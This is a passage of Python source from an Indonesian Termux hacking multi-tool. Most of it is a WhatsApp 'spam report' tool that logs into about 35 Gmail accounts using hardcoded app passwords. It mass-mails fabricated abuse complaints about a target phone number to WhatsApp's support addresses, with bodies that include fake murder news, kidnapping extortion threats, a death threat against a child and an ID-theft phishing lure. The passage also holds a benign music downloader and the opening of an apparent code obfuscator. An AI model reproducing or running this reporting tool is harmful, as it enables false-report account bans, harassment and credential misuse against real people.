        'legal@whatsapp.com',
        'safety@support.whatsapp.com',
        'appeals@whatsapp.com',
        'dmca@whatsapp.com',
        'takedown@whatsapp.com',
        'privacy@whatsapp.com',
        'press@whatsapp.com',
    ]

    def get_email_senders():
        return [
            {'email': 'termuxmikasa@gmail.com', 'app_password': 'jrpi ejvt rfte kuxd'},
            {'email': 'adrianardhiaksa86@gmail.com', 'app_password': 'vrhb arhq omjz pgus'},
            {'email': 'tt0861230@gmail.com', 'app_password': 'gtdy mllp rvft fdzt'},
            {'email': 'spamreportuntukproyek@gmail.com', 'app_password': 'rcjb wtpf cpmb zqmc'},
            {'email': 'ya2771326@gmail.com', 'app_password': 'bpex yhmi ymmm mzrt'},
            {'email': 'anonimousee909@gmail.com', 'app_password': 'vwsz udcr zwtn nddt'},
            {'email': 'anonimouse90909@gmail.com', 'app_password': 'hhgl fmji jsae sqxu'},
            {'email': 'anonimouse9099@gmail.com', 'app_password': 'qpss riuo pkjk tmeg'},
            {'email': 'anonimouse90999@gmail.com', 'app_password': 'ijrf hhuo jpml iysc'},
            {'email': 'aaabaaah2@gmail.com', 'app_password': 'oqtx elxg cefv dgvd'},
            {'email': 'anjaynathan399@gmail.com', 'app_password': 'cpil kwkt llab sodh'},
            {'email': 'joeellan26@gmail.com', 'app_password': 'wnfe iboi ktrr uder'},
            {'email': 'bayarutangllu@gmail.com', 'app_password': 'cbty vvaf rncu oawg'},
            {'email': 'asepanjang121@gmail.com', 'app_password': 'yidj nlkm irci yluy'},
            {'email': 'testimonialyayaya@gmail.com', 'app_password': 'mtkq kpaf gtjp zgbn'},
            {'email': 'buljem885@gmail.com', 'app_password': 'maug wpoh hddc uthh'},
            {'email': 'rahmanianabila75@gmail.com', 'app_password': 'elyn sgyr qqyx gxhi'},
            {'email': 'gufronjah@gmail.com', 'app_password': 'ulzr gfgd fhuj fahh'},
            {'email': 'dyantisukiem@gmail.com', 'app_password': 'zprf qelo tzqp wyac'},
            {'email': 'hilaryartasia@gmail.com', 'app_password': 'dscu jgry ikof ldcg'},
            {'email': 'satriaasiapayaaa@gmail.com', 'app_password': 'yzey ztnh apak xeva'},
            {'email': 'divikvidik@gmail.com', 'app_password': 'enkt cpcw beom ggey'},
            {'email': 'daemoniumuser@gmail.com', 'app_password': 'wgas iris atyy xpnc'},
            {'email': 'auto.send583@gmail.com', 'app_password': 'awlg kpsu rszi fppt'},
            {'email': 'cindyfiolita9@gmail.com', 'app_password': 'kpvu treo hfar zqdy'},
            {'email': 'gstorekonter4@gmail.com', 'app_password': 'xwdq ugie fbzw xeaa'},
            {'email': 'anonymousgalirus@gmail.com', 'app_password': 'ltnc fedd qzsy lfwu'},
            {'email': 'heckedbyx1@gmail.com', 'app_password': 'ibdf ukbz ugqd fqwu'},
            {'email': '0Anonymusy1@gmail.com', 'app_password': 'fvin nkbd tcrv wakf'},
            {'email': 'v8728799@gmail.com', 'app_password': 'wjng geyu qrjb qrkz'},
            {'email': 'malzoffcial5009@gmail.com', 'app_password': 'iebj mqgx xjuk wfs'},
            {'email': 'sonin.spd01@gmail.com', 'app_password': 'fkpp cyay qfdb syll'},
            {'email': 'shoope1456@gmail.com', 'app_password': 'ihwu mtuk ilpf hjng'},
            {'email': 'shoopee1456@gmail.com', 'app_password': 'bvee tsie vfgm spkk'},
            {'email': 'justzero194@gmail.com', 'app_password': 'nadf fgan fbew uyhc'},
        ]

    def buat_subject(nomor):
        subjects = [
         f'Report Abuse - {nomor}',
         f'Complaint - {nomor}',
         f'Fraud Alert - {nomor}',
         f'Spam Report - {nomor}',
         f'Legal Complaint - {nomor}',
         f'URGENT: Spam Report - {nomor}',
         f'Legal Notice: Harassment - {nomor}',
         f'Complaint: Fraud Activity - {nomor}',
         f'Formal Complaint: {nomor}',
         f'Immediate Action: {nomor}',
         f'Police Report: {nomor}',
         f'Tindak Lanjut: {nomor}',
         f'Violation of Terms - {nomor}',
         f'Security Alert: {nomor}',
         f'Scam Report: {nomor}',
         f'Harassment Report - {nomor}',
        ]
        return random.choice(subjects)

    def buat_body(nomor):
        templates_v1 = [
        f'''Para usuários de privacidade legal do WhatsApp.

Há notícias emocionantes, nomeadamente a descoberta da CABEÇA HUMANA.

Uma descoberta horrível foi relatada na área de Pasaje quando, por volta das 15h40, no FORTE LOS NARANJOS, os guardas do setor descobriram uma mochila suspeita.

Depois de examinar o conteúdo, uma cabeça humana foi encontrada no interior.

Policiais do circuito Velasco Ibarra foram imediatamente alertados e se deslocaram ao local para verificar a denúncia.

As autoridades confirmaram a presença da peça anatômica e iniciaram o isolamento da área para a realização dos procedimentos necessários.

Os investigadores estão atualmente a recolher informações sobre a origem da mala e as circunstâncias em que a mochila foi deixada.

A polícia solicitou a intervenção de unidades especiais para iniciar as investigações relacionadas.

Se você quiser ver as fotos do incidente, pode clicar no link 🔗👇

https://ibb.co.com/kJm3bzD

Abaixo está uma foto da vítima de homicídio 🔪🔪

Para mais informações sobre essa novidade maluca entre em contato pelo nosso WhatsApp 💬👇

https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor}'''
        ]
    
        templates_v2 = [
        f'''Olá senhor, 😈 Como está? Prazer em revê-lo 💀. Estou aqui para lhe dizer que raptei a sua esposa ☠️🔥 e abusei dela 💦🫦. Se não acredita em mim, pode espreitar a foto neste link 👇👇
Link: https://h.top4top.io/p_3848e3n7b1.jpg
Se quiser que este assédio sexual contra a sua mulher pare 🥷, terá de me pagar 🤑 e encontramo-nos num prédio que nunca ninguém visitou 🤫. Se chegarmos a um acordo, a mulher do meu senhor será libertada. Entre em contacto aqui se o nosso acordo estiver garantido.

https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor}'''
        ]
    
        templates_v3 = [
        f'''لنربح ٥٠٠ دولار! كيف ذلك يا صديقي؟ ببساطة، ادخل إلى هذا الرابط الرائع! 🥰🔥
الرابط: https://rank-1.mamtahospitalwakad.com
الشروط والأحكام 👇
• أدخل بيانات بطاقة هويتك.

• التقط صورة سيلفي واضحة لكل جانب من جوانب وجهك.

• أدخل جميع معلوماتك.

يرجى التواصل مع المسؤول أدناه 🤑👇

https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor}'''
        ]
    
        templates_v4 = [
        f'''עברית:

*היי! לילה טוב משפחת פאנק ☠️🔪*  
אני כאן כדי ליצור איתכם קשר 💀, כדי שכל העושר והרכוש שלכם 💸 יועברו אלינו 🔪.  
אם לא תעבירו אלינו? אני אהרוג את הילד שלכם!! 😈🔥  
אם אתם לא מאמינים לי? תבדקו את תמונת ההוכחה הזו 👇👇  
קישור: https://j.top4top.io/p_3848w3yun1.jpg

אם אתם מסכימים? בבקשה תעשו מה שאני מבקש.  
אם אתם מסכימים, צרו קשר עם המספר שלנו למטה 🥷👇  
https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor}'''
        ]
        templates_v5 = [f'''
Chào cộng đồng WhatsApp thân mến, có thông tin cho biết có người đã vi phạm quy tắc của WhatsApp và có hành vi spam nghiêm trọng. Để xem ảnh, hãy nhấp vào liên kết này 👇
https://h.top4top.io/p_3849527i51.jpg

Gửi đến người gây ra hành vi này tại số điện thoại này 👇
https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor},

Vui lòng liên hệ ngay với số điện thoại này để ngăn chặn hành vi tương tự xảy ra lần nữa, hoặc xóa số điện thoại của người gây ra hành vi này. 🙏 Đó là tất cả từ tôi, cảm ơn và mong các bạn thông cảm về thông tin mới nhất. 🙏'''
        ]

        all_templates = templates_v1 + templates_v2 + templates_v3 + templates_v4 + templates_v5
        return random.choice(all_templates)

    def kirim_email(sender_info, nomor):
     try:
        msg = MIMEMultipart()
        msg['From'] = sender_info['email']
        msg['Subject'] = buat_subject(nomor)
        msg.attach(MIMEText(buat_body(nomor), 'plain'))

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender_info['email'], sender_info['app_password'])
        except:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.login(sender_info['email'], sender_info['app_password'])

        server.sendmail(sender_info['email'], EMAIL_TARGETS, msg.as_string())
        server.quit()
        time.sleep(random.uniform(2, 5))
        return True
     except Exception as e:
        return False

    def validasi_nomor(nomor_input):
        try:
            if not nomor_input.startswith('+'):
                nomor_input = '+' + nomor_input
            parsed = phonenumbers.parse(nomor_input, None)
            if phonenumbers.is_valid_number(parsed):
                return phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
        except:
            pass
        return None

    def spam_report_main():
        banner_Spammer()

        print(f"{W}╭──────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ Masukkan Nomor Target Format Internasional Whatsapp.{r}")
        print(f"{W}│ Contoh{m}:{h} +62×××× {r}")
        print(f"{W}╰──────────────────────────────────────────────────────────────────╯")

        nomor_input = input(f"{U}❯❯❯ {W}Masukkan Nomor target{h}❯{p} ").strip()

        if nomor_input == "+6283832110509":
           print("ngapain Kocak?😹")
           os._exit(0)

        if nomor_input == "+6285143754083":
           print("ngapain Kocak?😹")
           os._exit(0)

        if not nomor_input:
            print(f"\n {p}[{m}!{p}] Nomor Tidak Boleh Kosong Tekan {h}Enter{p} Untuk Kembali{r}")
            input()
            return

        nomor = validasi_nomor(nomor_input)
        if not nomor:
            print(f"\n {p}[{m}!{p}] Format Nomor Tidak Valid Tekan {h}Enter{p} Untuk Kembali{r}")
            input()
            return

        senders = get_email_senders()
        if not senders:
            print(f"\n {p}[{m}!{p}] Gagal Memuat Sender. Coba Lagi Nanti │ Tekan {h}Enter{p} Untuk Kembali{r}")
            input()
            return

        print()

        stop_event = threading.Event()
        t = threading.Thread(target=loadbar_ban, args=(stop_event,))
        t.daemon = True
        t.start()

        hasil = []
        for sender in senders:
            ok = kirim_email(sender, nomor)
            hasil.append(ok)
            time.sleep(random.uniform(1, 3))

        stop_event.set()
        t.join()

        berhasil = sum(hasil)
        gagal = len(hasil) - berhasil

        print()
        print(f"{W}╭─────────────────────────────────────────────────────────────╮")
        print(f"{W}│{h} [✦] {p}Spam Report Berhasil Terkirim                             {N}")
        print(f"{W}│{h} [✦] {p}Berhasil Terkirim{m}:{h} {berhasil}  {m}| {p}Gagal Terkirim{m}:{h} {gagal}{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────╯")
        input(f"\n{p} Tekan {h}Enter{p} Untuk Kembali{r}")

    spam_report_main()

def tool_musik():
    import os, sys, time, json, threading, re, subprocess
    from datetime import datetime

    os.system('clear')

    MUSIC_DIR = "/sdcard/Music/Spotify"
    if not os.path.exists(MUSIC_DIR):
        try:
            os.makedirs(MUSIC_DIR)
        except:
            MUSIC_DIR = "./music_downloads"
            if not os.path.exists(MUSIC_DIR):
                os.makedirs(MUSIC_DIR)

    HISTORY_FILE = os.path.join(MUSIC_DIR, "history.json")

    def load_history():
        try:
            with open(HISTORY_FILE, 'r') as f:
                data = json.load(f)
                if isinstance(data, list):
                    valid_data = []
                    for item in data:
                        if isinstance(item, dict) and 'judul' in item and 'pembuat' in item and 'path' in item:
                            valid_data.append(item)
                    return valid_data
                return []
        except:
            return []

    def save_history(history):
        try:
            with open(HISTORY_FILE, 'w') as f:
                json.dump(history, f, indent=2)
        except:
            pass

    def load_bar(stop_event, text="Processing"):
        COLORS = ['\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] {text} [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()

    def cari_lagu(query):
        cmd = ['yt-dlp', '--flat-playlist', '--dump-json', f"ytsearch5:{query} audio"]
        hasil = subprocess.run(cmd, capture_output=True, text=True)
        if hasil.returncode != 0:
            return None
        data = []
        for line in hasil.stdout.strip().split('\n'):
            try:
                j = json.loads(line)
                data.append({
                    'judul': j.get('title', 'Unknown'),
                    'durasi': j.get('duration', 0),
                    'pembuat': j.get('uploader', 'Unknown')
                })
            except:
                continue
        return data

    def download_lagu(judul, pembuat):
        nama = f"{pembuat} - {judul}.mp3"
        nama = re.sub(r'[<>:"/\\|?*]', '_', nama)
        path = os.path.join(MUSIC_DIR, nama)
        cmd = ['yt-dlp', '-x', '--audio-format', 'mp3', '-o', path, f"ytsearch:{judul} {pembuat} audio"]
        subprocess.run(cmd, capture_output=True, text=True)
        if os.path.exists(path):
            history = load_history()
            history.append({
                'judul': judul,
                'pembuat': pembuat,
                'path': path,
                'waktu': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            })
            save_history(history)
            return path
        return None

    def putar(path):
        try:
            proc = subprocess.Popen(['mpv', '--no-video', '--really-quiet', path],
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
            print(f"{W}Tekan {R}Enter{W} untuk berhenti{N}")
            while True:
                try:
                    if proc.poll() is not None:
                        break
                    import select
                    import sys
                    if select.select([sys.stdin], [], [], 0.5)[0]:
                        input()
                        proc.terminate()
                        proc.wait()
                        print(f"\n{R}✦ Pemutaran dihentikan{N}")
                        break
                except KeyboardInterrupt:
                    pass
        except FileNotFoundError:
            try:
                proc = subprocess.Popen(['ffplay', '-nodisp', '-autoexit', '-loglevel', 'quiet', path],
                                        stdout=subprocess.DEVNULL,
                                        stderr=subprocess.DEVNULL)
                print(f"{W}Tekan {R}Enter{W} untuk berhenti{N}")
                while True:
                    if proc.poll() is not None:
                        break
                    import select
                    import sys
                    if select.select([sys.stdin], [], [], 0.5)[0]:
                        input()
                        proc.terminate()
                        proc.wait()
                        print(f"\n{R}✦ Pemutaran dihentikan{N}")
                        break
            except:
                pass
        except:
            pass

    def tampilkan_history():
        history = load_history()
        if not history:
            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ Belum ada history download{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
            return None
        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {G}History {R}:{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
        for i, item in enumerate(reversed(history[-10:]), 1):
            judul = item['judul'][:35] + '...' if len(item['judul']) > 35 else item['judul']
            pembuat = item['pembuat'][:20] + '...' if len(item['pembuat']) > 20 else item['pembuat']
            print(f"{W}│ {W}[ {G}{i}{W} ] {G}{judul}{W} - {G}{pembuat}")
            print(f"{W}│     {W}Waktu: {G}{item.get('waktu', 'Unknown')}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
        return history

    def hapus_history():
        if os.path.exists(HISTORY_FILE):
            os.remove(HISTORY_FILE)
            print(f"\n{G}History berhasil dihapus!{N}")
        else:
            print(f"\n{Y}Tidak ada history untuk dihapus{N}")

    def show_banner():
        play_menu_sound()
        os.system('clear')
        banner_musik = """
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⢿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⢿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⠇⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⣿⣿⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣇⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⣼⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡀⠀⠀⠀⠀
    ⠀⣠⣤⣴⣿⣿⣷⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣿⣿⣷⣦⣤⣄⠀
    ⢸⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⡇
    ⠈⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⢿⣿⠀⠀⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠁
    ⠀⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡿⠈⣿⠀⢠⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡿⠀
    ⠀⢸⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⢠⣤⣤⣤⣤⣤⣤⣤⣿⠃⠀⣿⡇⢸⡏⠹⠷⠶⠶⠶⠶⠆⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⡇⠀
    ⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
    ⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
    ⠀⠀⠹⣿⣿⣿⡿⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠿⢿⣿⣿⣿⠏⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
        os.system(f'echo "{banner_musik}" | lolcat 2>/dev/null || echo "{banner_musik}"')
        print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Author {W}:{G} Rullzzz06,{W} Tools {W}: {G}Music
{W}╰─────────────────────────────────────────────────────────────────╯{N}
{W}╭─────────────────────────────────────────────────────────────────╮{N}
{W}│ {W}[ {G}1{W} ]  Cari & Download Lagu{N}
{W}│ {W}[ {G}2{W} ]  History Download{N}
{W}│ {W}[ {G}3{W} ]  Putar dari History{N}
{W}│ {W}[ {G}4{W} ]  Hapus History{N}
{W}│ {W}[ {R}0{W} ]  Back{N}
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")
        print(f"{U}❯❯❯{W} Pilih Menu {G}:{W} ", end="")

    while True:
        show_banner()
        pilih = input().strip()

        if pilih == "1":
            print(f"{W}╭─────────────────────────────────────────────────────────────────╮{N}")
            print(f"{W}│ Masukkan {G}Judul Lagu{W} untuk di Play")
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")

            query = input(f"{U}❯❯❯{W} Masukkan Judul Song{R} :{W} ").strip()
            if not query:
                print(f"\n{R}Judul lagu tidak boleh kosong!{N}")
                input(f"\n{W}[ {G}✦{W} ] Tekan {R}Enter{W} Untuk Kembali...{N}")
                continue

            print(f"\n{G}Mencari: {W}{query}{N}")

            stop = threading.Event()
            t = threading.Thread(target=load_bar, args=(stop, f"Mohon Tunggu Sedang mencari lagu {a}⏱{N}"))
            t.daemon = True
            t.start()
            time.sleep(1.5)

            hasil = cari_lagu(query)
            stop.set()
            t.join()

            if not hasil:
                print(f"\n{R}X Tidak ada hasil{N}")
                input(f"\n{W}[ {G}✦{W} ] Tekan {R}Enter{W} Untuk Kembali...{N}")
                continue

            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {G}OK{W} Menemukan {W}{len(hasil)}{W} hasil{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────────┤")

            for i, lagu in enumerate(hasil, 1):
                judul = lagu['judul'][:30] + '...' if len(lagu['judul']) > 30 else lagu['judul']
                pembuat = lagu['pembuat'][:30] + '...' if len(lagu['pembuat']) > 30 else lagu['pembuat']
                m = lagu['durasi'] // 60
                d = lagu['durasi'] % 60
                print(f"{W}│ {W}[ {G}{i}{W} ] {G}{judul}{W}")
                print(f"{W}│     {W}Uploader{W}: {G}{pembuat}")
                print(f"{W}│     {W}Durasi{W}: {G}{m}:{d:02d}")
                print(f"{W}├─────────────────────────────────────────────────────────────────┤")

            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")

            no = 0
            try:
                no = int(input(f"\n{U}❯❯❯{W} Pilih nomor {a}(1-{len(hasil)}){W} atau {R}0{W} batal{G} :{W} "))
                if no == 0:
                    continue
                if 1 <= no <= len(hasil):
                    pilihan = hasil[no-1]
                else:
                    print(f"{R}Nomor tidak valid!{N}")
                    continue
            except:
                print(f"{R}Masukkan angka!{N}")
                continue

            judul = pilihan['judul']
            pembuat = pilihan['pembuat']

            print(f"\n{W}Download: {G}{judul}{W} - {G}{pembuat}{N}")

            stop = threading.Event()
            t = threading.Thread(target=load_bar, args=(stop, "Mengunduh Audio"))
            t.daemon = True
            t.start()

            path = download_lagu(judul, pembuat)
            stop.set()
            t.join()

            if path:
                print(f"\r{W}[ {G}✦{W} ] Download selesai!{N}")
                putar_lagu = input(f"\n{U}❯❯❯{W} Putar sekarang {G}? (y/n){W} : ").lower()
                if putar_lagu == 'y' or putar_lagu == 'Y':
                    print(f"\n{W}Memutar: {G}{judul}{W} - {G}{pembuat}{N}")
                    putar(path)
            else:
                print(f"\n{R}X Gagal download! Pastikan yt-dlp terinstall{N}")
                print(f"{W}Install: pkg install yt-dlp{N}")

            input(f"\n{W}[ {G}✦{W} ] Tekan {R}Enter{W} Untuk Kembali...{N}")

        elif pilih == "2":
            tampilkan_history()
            input(f"\n{W}[ {G}✦{W} ] Tekan {R}Enter{W} Untuk Kembali...{N}")

        elif pilih == "3":
            history = load_history()
            if not history:
                print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
                print(f"{W}│ {Y}Belum ada history download{N}")
                print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
                input(f"\n{W}[ {G}✦{W} ] Tekan {R}Enter{W} Untuk Kembali...{N}")
                continue

            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {G}History {R}:{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────────┤")
            for i, item in enumerate(reversed(history[-10:]), 1):
                judul = item['judul'][:35] + '...' if len(item['judul']) > 35 else item['judul']
                pembuat = item['pembuat'][:20] + '...' if len(item['pembuat']) > 20 else item['pembuat']
                print(f"{W}│ {W}[ {G}{i}{W} ] {G}{judul}{W} - {G}{pembuat}")
                print(f"{W}│     {W}Waktu: {G}{item.get('waktu', 'Unknown')}")
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")

            try:
                no = int(input(f"\n{U}❯❯❯{W} Pilih nomor lagu {a}(1-{min(10, len(history))}){W} atau {R}0{W} batal{G} :{W} "))
                if no == 0:
                    continue
                if 1 <= no <= min(10, len(history)):
                    item = list(reversed(history[-10:]))[no-1]
                    if os.path.exists(item['path']):
                        print(f"\n{W}Memutar: {G}{item['judul']}{W} - {G}{item['pembuat']}{N}")
                        putar(item['path'])
                    else:
                        print(f"\n{R}File tidak ditemukan!{N}")
                else:
                    print(f"{R}Nomor tidak valid!{N}")
            except:
                print(f"{R}Masukkan angka!{N}")

            input(f"\n{W}[ {G}✦{W} ] Tekan {R}Enter{W} Untuk Kembali...{N}")

        elif pilih == "4":
            hapus_history()
            input(f"\n{W}[ {G}✦{W} ] Tekan {R}Enter{W} Untuk Kembali...{N}")

        elif pilih == "0":
            print(f"\n{W}Back To {G}Mikasa{N}")
            time.sleep(2)
            break

        else:
            print(f"\n{R}Pilihan tidak valid!{N}")
            input(f"\n{W}[ {G}✦{W} ] Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_encryptor():
   play_menu_sound()
   import os, sys, time, random, string, base64, zlib, marshal, hashlib, hmac, struct, threading

   os.system('clear')

   R = '\033[91m'
   G = '\033[92m'
   Y = '\033[93m'
   W = '\033[97m'
   N = '\033[0m'

   ascii_obf = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⡀⡀⡀⡀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⠞⠁⠀⠀⠀⠀⠀⠀⢀⠠⠀⠂⠌⠌⠐⢈⠀⢐⠀⠐⡁⠈⠈⡂⡁⠄⠄⡀⠀⠀⠀⠀⠀⠀⠈⠳⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⠄⣴⣿⡿⠃⠀⠀⠀⠀⠀⡀⠐⠈⠀⠀⡠⠁⠀⠀⠠⠂⠀⢀⠂⠀⠐⡀⠀⠀⠐⢀⠀⠀⠁⠂⡀⠀⠀⠀⠀⠀⠘⢿⣿⣦⠠⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⠃⣼⣿⠟⡰⠀⠀⠀⠀⡀⠂⠈⠐⠠⠠⢈⠀⠀⠀⠀⠅⠀⠀⢀⠂⠀⠀⢐⠀⠀⠀⠀⠨⠀⠄⠂⠈⠐⠠⠀⠀⠀⠀⢎⠻⢿⣧⠘⣿⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⢐⣿⡗⠰⢋⣡⣾⠁⠀⠀⡀⠂⠀⠀⠀⠀⠠⠁⠀⠂⠂⠂⠌⠄⢄⣴⢒⠶⣶⣤⠐⡐⠠⠁⠁⠁⠁⢂⠀⠀⠀⠀⠁⢂⠀⠀⠘⣷⣌⡙⠆⣹⣿⡄⢄⠀⠀⠀⠀
⠀⠀⣰⡇⢸⣿⢃⣴⣿⠟⠁⠀⢀⠂⠀⠀⠀⠀⠀⠠⠁⠀⠀⠀⠀⠀⠌⠀⠘⠿⠁⡂⣿⣿⠂⠐⠀⠀⠀⠀⠀⠐⡀⠀⠀⠀⠀⠀⠂⠄⠀⠈⠻⣿⣦⣘⣿⡇⢸⣆⠀⠀⠀
⠀⢠⣿⡇⢸⣯⡿⠛⣡⠀⠀⢀⢂⠀⠀⠀⠀⠀⠀⠅⠀⠀⠀⠀⠀⠠⠁⠀⠀⠀⢀⡾⠋⠁⠀⠈⠄⠀⠀⠀⠀⠀⠐⡀⠀⠀⠀⠀⠀⠡⢀⠀⠐⣌⠙⢿⣾⡃⣸⣿⠄⠀⠀
⠀⢸⣿⡯⢘⢋⣤⣿⠇⠀⢀⠂⠀⠈⠐⠐⠠⠠⠨⢀⠀⠀⠀⠀⠀⠨⠀⠀⠀⠀⢀⠃⠀⠀⠀⠀⠅⠀⠀⠀⠀⢀⢀⠂⠄⢐⠠⠁⠁⠁⠐⡀⠀⠹⣷⣆⡹⠅⢾⣿⠇⠀⠀
